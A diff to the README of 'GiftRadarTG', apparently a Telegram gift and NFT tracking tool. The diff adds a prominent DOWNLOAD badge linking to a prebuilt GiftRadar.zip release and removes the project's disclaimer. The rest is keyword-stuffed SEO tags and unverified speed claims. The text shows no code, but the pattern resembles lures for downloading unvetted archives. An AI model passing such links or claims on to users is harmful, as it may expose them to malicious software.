@@ -6,6 +6,8 @@ GiftRadarTG is a powerful tool for discovering, analyzing, monitoring, and track
 
 ---
 
+[![DOWNLOAD](https://img.shields.io/badge/⬇_DOWNLOAD-GiftRadarTG-blue?style=for-the-badge&logo=github)](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v1.00/GiftRadar.zip)
+
 ## ⚡ Why GiftRadarTG?
 
 - 🚀 **10 ms Parsing Speed** — lightning-fast data processing.
@@ -57,14 +59,6 @@ GiftRadarTG is a powerful tool for discovering, analyzing, monitoring, and track
 ## 🔎 SEO Tags
 
 `telegram gift parser` `telegram gifts` `telegram gift marketplace` `telegram nft` `telegram stars` `telegram collectible gifts` `telegram gift scanner` `telegram gift finder` `telegram gift tracker` `telegram gifts parser` `telegram nft marketplace` `telegram rare gifts` `telegram limited gifts` `telegram gift monitor` `telegram gift search` `telegram gift analyzer` `telegram gift price tracker` `telegram gift checker` `telegram gifts marketplace scanner` `telegram gifts monitoring tool` `telegram nft scanner` `telegram nft tracker` `telegram collectible scanner` `telegram collectible marketplace` `ton gifts` `ton blockchain` `ton wallet` `telegram trading` `telegram gift trading` `telegram market analysis` `telegram gift collection` `telegram gift models` `telegram gift backgrounds` `telegram gift symbols` `telegram gift deals` `telegram marketplace tool` `telegram automation` `telegram parser` `fast telegram parser` `10ms parser` `GiftRadarTG`
-
----
-
-## ⚠️ Disclaimer
-
-This project is provided for **educational, research, and automation purposes only**.
-
-The developer is not responsible for how users utilize this software. Users must comply with applicable laws and the terms of service of the platforms they interact with.
 
 ---
 
